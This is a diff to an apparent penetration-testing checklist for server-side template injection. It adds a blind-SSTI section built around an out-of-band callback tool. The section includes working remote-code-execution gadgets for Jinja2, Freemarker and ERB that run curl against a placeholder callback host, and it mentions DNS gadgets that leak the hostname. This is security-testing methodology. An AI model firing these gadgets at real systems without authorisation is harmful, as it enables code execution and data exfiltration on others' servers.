@@ -16,6 +16,7 @@ origin: AI Threat Hunting
 
 - curl / Burp Suite Repeater
 - SSTImap (automated SSTI detection and exploitation — active successor to tplmap)
+- `aith oob mint` / `aith oob poll` (mint a nonce-tagged callback URL and correlate blind-SSTI hits — see §5 Blind SSTI; replaces reading the listener log by hand)
 - Custom polyglot payloads
 
 ## Methodology
@@ -85,8 +86,26 @@ origin: AI Threat Hunting
 
 ### 5. Blind SSTI
 
+When `{{7*7}}` evaluates server-side but the result is not reflected back (rendered into a PDF, email, or a fire-and-forget job), out-of-band is the reliable confirmation channel.
+
 - [ ] Time-based: inject sleep or heavy computation
-- [ ] Out-of-band: DNS/HTTP callback from template execution
+- [ ] **Out-of-band (preferred):** mint a nonce-tagged callback, embed it in an engine-specific RCE gadget so template execution fires the callback, then poll for the correlated hit:
+      ```bash
+      aith oob status --json   # confirm readiness
+      aith oob mint --technique ssti --target-url "https://target/profile" --param bio --probe-kind http --json
+      # -> http  http://<prefix>-<token>.researcher.example/
+      ```
+      Embed the minted host in the gadget for the fingerprinted engine and deliver via the kali exec wrapper:
+      ```
+      Jinja2:     {{config.__class__.__init__.__globals__['os'].popen('curl http://<prefix>-<token>.researcher.example/').read()}}
+      Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl http://<prefix>-<token>.researcher.example/")}
+      ERB:        <%= `curl http://<prefix>-<token>.researcher.example/` %>
+      ```
+      Then correlate instead of grepping the listener log:
+      ```bash
+      aith oob poll --client <name> --json
+      ```
+      A non-empty `matched` array for your nonce confirms blind RCE — each match ties the callback (`protocol`, `remote_address`) to the recorded probe (`technique`, `target_url`). A DNS-only callback (use `--probe-kind dns` and `nslookup`/`$(hostname).<host>` gadgets where curl is stripped) still confirms execution and can exfil one label of data. Empty `matched` after the payload lands → fall back to time-based/error-based and record a runtime issue.
 - [ ] Error-based: force errors that leak data
 
 ## What to Record
